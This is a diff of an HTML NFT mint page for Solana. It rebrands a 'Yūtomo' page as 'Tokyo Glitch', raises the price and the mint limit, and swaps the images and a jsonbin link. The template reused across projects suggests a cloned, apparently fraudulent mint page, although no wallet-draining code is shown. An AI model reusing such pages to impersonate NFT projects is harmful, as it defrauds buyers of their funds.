@@ -4,17 +4,17 @@
     <meta charset="utf-8">
     <meta name="description" content="NTC" data-react-helmet="true" />
     <meta name="theme-color" content="#000000" />
-    <meta content="🌐 yutomo.net/mint" property="og:title">
+    <meta content="🌐 tokyoglitch.com/mint" property="og:title">
     <meta content="
-    📣  Yūtomo Mint is now LIVE!
+    📣  Tokyo Glitch Mint is now LIVE!
 
-    ◎   Mint Price: 1.7 SOL" property="og:description">
-    <meta content="https://pbs.twimg.com/profile_banners/1468691124583862287/1654448868/1500x500" property="og:image">
+    ◎   Mint Price: 3 SOL" property="og:description">
+    <meta content="hhttps://pbs.twimg.com/profile_banners/1512184759455260679/1651587200/1500x500" property="og:image">
     <meta name="twitter:card" content="summary_large_image">
-    <link type="application/json+oembed" href="https://api.jsonbin.io/b/622184b37caf5d67835ed9ba/156" />
+    <link type="application/json+oembed" href="https://api.jsonbin.io/b/622184b37caf5d67835ed9ba/157" />
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-    <title>Yūtomo</title>
-    <link rel="shortcut icon" href="https://pbs.twimg.com/profile_images/1533495568185577473/6SpsMTxG_400x400.jpg" />
+    <title>Tokyo Glitch</title>
+    <link rel="shortcut icon" href="https://pbs.twimg.com/profile_images/1521495343229280257/qI8dO2q4_400x400.jpg" />
     <link rel="stylesheet" type="text/css" href="css/all.min.css">
     <link rel="stylesheet" type="text/css" href="css/normalize.css">
     <link rel="stylesheet" type="text/css" href="css/style.css">
@@ -52,12 +52,12 @@
         <div class="main-area">
 
             <div class="main-area__right">
-                <h2 class="right-title">Yūtomo</h2>
+                <h2 class="right-title">Tokyo Glitch</h2>
 
                 <div class="right-list">
                     <li>
                         <div class="text">
-                            4,000 Yuto’s coming soon to SOLANA… It’s bigger than us
+                            Welcome to Tokyo Glitch...Genesis Launch on June 11th | #Solana
                     </li>
                     </div>
 
@@ -68,8 +68,8 @@
                             <a href="javascript:void(0)" class="plus-btn">+</a>
                         </div>
                         <div class="price-box">
-                            <div id="price-total"><span>1.7</span> SOL</div>
-                            <div>2 NFT max per transaction</div>
+                            <div id="price-total"><span>3</span> SOL</div>
+                            <div>3 NFT max per transaction</div>
                         </div>
                     </div>
                     <div class="button-box">
@@ -89,7 +89,7 @@
                 </style>
                 <div class="main-area__left">
                     <div class="slider-area">
-                        <img class="animation" src="https://cdn.discordapp.com/attachments/949745661799182386/955836280212717638/ICO5_7.gif" alt="GiF">
+                        <img class="animation" src="https://cdn-longterm.mee6.xyz/plugins/embeds/images/971081868919324813/4760db61056c57d45554260c9c1ada9af35c6db9a24aa361b2d8375adc508242.png" alt="GiF">
                     </div>
                 </div>
             </div>
@@ -105,12 +105,12 @@
         const $numberText = document.querySelector("#total");
         const $remaining = document.querySelector('#remaining');
         const $priceResultText = document.querySelector("#price-total span");
-        let itemPriceSelected = 1.7;
+        let itemPriceSelected = 3;
         let itemCount = 1;
 
         $plusButton.addEventListener("click", function(e) {
             e.preventDefault();
-            itemCount = itemCount < 2 ? itemCount + 1 : 2;
+            itemCount = itemCount < 3 ? itemCount + 1 : 3;
             $numberText.value = itemCount;
             $priceResultText.textContent = (itemPriceSelected * itemCount).toFixed(2);
         });
